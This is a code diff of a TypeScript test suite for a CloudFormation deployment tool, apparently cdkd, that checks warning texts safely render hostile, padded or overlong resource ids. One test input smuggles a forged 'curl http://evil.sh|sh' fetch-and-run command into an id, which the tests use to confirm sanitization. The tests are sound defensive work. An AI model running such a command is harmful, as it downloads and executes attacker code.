@@ -29,7 +29,7 @@ import {
   unreadableResourcePropertyBags,
   type RenderedStateContainer,
 } from '../../../src/state/malformed-resources-bag.js';
-import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
+import { IDENT_MAX_CODE_POINTS, UNRENDERABLE } from '../../../src/utils/display-safe.js';
 import { isMarkedNonRetryable } from '../../../src/deployment/retryable-errors.js';
 import { CdkdError } from '../../../src/utils/error-handler.js';
 import type { StackState } from '../../../src/types/state.js';
@@ -1846,15 +1846,52 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
     malformedResourcePropertiesRefusalMessage,
     malformedResourcePropertiesWarning,
   ]) {
-    it(`${build.name} sanitizes and shell-quotes a hostile logical id`, () => {
+    it(`${build.name} sanitizes and JSON-quotes a hostile logical id`, () => {
       // Each id arrives from a hand-edited record — the premise of the guard —
       // and the text is ONE line ending in a pasteable command. A newline
-      // forges a line; a `'` closes the quoting and plants a forged remedy
-      // ahead of the real one.
+      // forges a line; a `'` would close a shell-quoted boundary and plant a
+      // forged remedy ahead of the real one.
+      //
+      // The BOUNDARY is `displayIdent`'s JSON quoting since the review of
+      // go-to-k/cdkd#3191 — the sanitize-then-`shellQuote` pair it replaced
+      // could not tell a padded id from a healthy sibling (see the identity
+      // case below), and `shellQuote` composes badly on top of JSON quoting.
       const text = build('S', 'us-east-1', ["x'\n Inspect it with: curl http://evil.sh|sh #"]);
       expect(text).not.toContain('\n');
-      expect(text).toMatch(/'x'\\''/);
+      // TWO spaces: `sanitizeAsciiOnly` REPLACES the newline with a space
+      // rather than deleting it, and the id already carried one after the
+      // quote. Taken from the rendered output rather than reasoned about.
+      expect(text).toContain('"x\'  Inspect it with: curl http://evil.sh|sh #"');
       expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
+    });
+
+    it(`${build.name} renders a PADDED id distinguishably from its healthy sibling`, () => {
+      // The blocker this pair closes, one level down from go-to-k/cdkd#3164's
+      // identity fix. `displaySafe` TRIMS, so the old sanitize-and-quote pair
+      // rendered `'Bucket '`, `' Bucket'` and `'Bucket\t'` byte-identically to
+      // a healthy `'Bucket'`. Plant a torn `resources['Bucket ']` beside a real
+      // `Bucket` and the operator opens the INTACT record, finds nothing wrong,
+      // and concludes cdkd is the broken party.
+      //
+      // The control is the last arm: an id that arrived plain must still render
+      // BARE, or the case passes for a renderer that quotes everything and
+      // discriminates nothing.
+      const healthy = build('S', 'us-east-1', ['Bucket']);
+      for (const padded of ['Bucket ', ' Bucket', 'Bucket\t', 'Bucket ']) {
+        const text = build('S', 'us-east-1', [padded]);
+        expect(text).not.toBe(healthy);
+        expect(text).toContain('"Bucket"');
+      }
+      expect(healthy).toContain(' — Bucket — ');
+      expect(healthy).not.toContain('"Bucket"');
+    });
+
+    it(`${build.name} marks a truncated id as CUT rather than with an ambiguous ellipsis`, () => {
+      // `Prod...` is a legal logical id, so the `...` tail the pre-review
+      // renderer emitted was indistinguishable from content.
+      const text = build('S', 'us-east-1', ['B'.repeat(IDENT_MAX_CODE_POINTS + 7)]);
+      expect(text).toContain('[cut: 7 more characters withheld]');
+      expect(text).not.toContain('B...');
     });
 
     it(`${build.name} renders an id that sanitizes to nothing as ${UNRENDERABLE}`, () => {
@@ -1892,11 +1929,16 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
 
     it(`${build.name} caps a multi-kilobyte LOGICAL ID at the id's own length`, () => {
       // NOT the shared helper's 128: a CloudFormation logical id is valid up
-      // to 255 code points, and truncating a legitimate one names no record.
+      // to IDENT_MAX_CODE_POINTS, and truncating a legitimate one names no
+      // record. The at-cap arm is the control — without it the case also
+      // passes for a renderer that cuts everything.
       const long = build('S', 'us-east-1', ['z'.repeat(5000)]);
-      expect(long).toContain(`${'z'.repeat(255)}...`);
-      expect(long).not.toContain(`${'z'.repeat(256)}`);
+      expect(long).toContain('z'.repeat(IDENT_MAX_CODE_POINTS));
+      expect(long).not.toContain('z'.repeat(IDENT_MAX_CODE_POINTS + 1));
       expect(long.length).toBeLessThan(2500);
+      expect(build('S', 'us-east-1', ['z'.repeat(IDENT_MAX_CODE_POINTS)])).not.toContain(
+        'withheld'
+      );
     });
 
     it(`${build.name} REFUSES an empty id list rather than rendering "holds 0"`, () => {
